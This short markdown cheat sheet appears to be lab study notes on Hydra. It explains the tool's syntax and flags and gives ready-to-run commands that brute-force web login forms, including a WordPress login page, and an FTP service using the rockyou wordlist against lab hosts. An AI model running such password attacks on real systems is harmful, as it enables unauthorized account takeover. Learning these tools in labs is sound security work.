# Hydra
Attacks systems with brute forcing with a collection of passwords & usernames.
Most common passwords location: `/usr/share/wordlists/rockyou.txt`

hydra syntax:
```
hydra -l USERNAME -P WORDLIST.txt ATTACKING_IPorSERVER http-REQUEST-form "/LOGINPAGE.php:User=^USER^&pwd=^PWD^:MESSAGE" -t 30
```
Example:
```
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
```

- `-l username`: *-l* should precede the username, i.e. the login name of the target.
	- `-L`: To use a file with a list of usernames
- `-P wordlist.txt`: *-P* precedes the wordlist.txt file, which is a text file containing the list of passwords you want to try with the provided username
	- `-p`: To use a single password
- `server`: Hostname or IP address of the target
- `http-REQUEST-form`: Defines the form used to send the login
	- Post, get, etc. 
- `"/LOGINPAGE.php`: Defines the login page
- `User=^USER^&pwd=^PWD^`: The syntax this form uses to define the username and password. 
	- `^USER^`: Where hydra will use our username
	- `^PWD^`: Where hydra will use our password 
-`MESSAGE`: The message that we receive when we don't get a valid response

**Example**:
```
hydra -L fsocity.dic -p test 10.10.178.83 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.209.178
```
#### Options
`-s PORT`: Specifies a port for the service in question
`-V: Verbose`. Shows all username & password combinations being tried
`-d`: Debugging
